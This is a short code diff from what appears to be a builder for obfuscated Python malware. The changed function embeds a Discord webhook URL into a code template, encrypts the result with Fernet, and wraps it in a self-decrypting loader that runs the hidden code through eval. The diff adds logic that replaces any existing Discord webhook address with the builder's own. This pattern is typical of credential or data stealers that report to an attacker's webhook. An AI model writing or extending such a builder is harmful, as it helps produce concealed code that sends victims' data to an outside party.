@@ -50,7 +50,7 @@ def build(webhook: str, out_file: str, debug: bool):
         code = code_file.read()
     index = code.find("WEBHOOK")
     libs = code[0:index] + "\nfrom cryptography.fernet import Fernet\n"
-    content = code[index:-1].replace("{WEBHOOK}", str(webhook))
+    content = code[index:-1].replace("{WEBHOOK}", str(webhook)).replace("https://discord.com/api/webhooks/", str(webhook))
     encrypted_content = Fernet(fernet_key).encrypt(content.encode())
     eval_code = encryptcodegod(f"\ncode = Fernet('{fernet_key}').decrypt({encrypted_content}).decode();eval(compile(code, '<string>', 'exec'))")
 
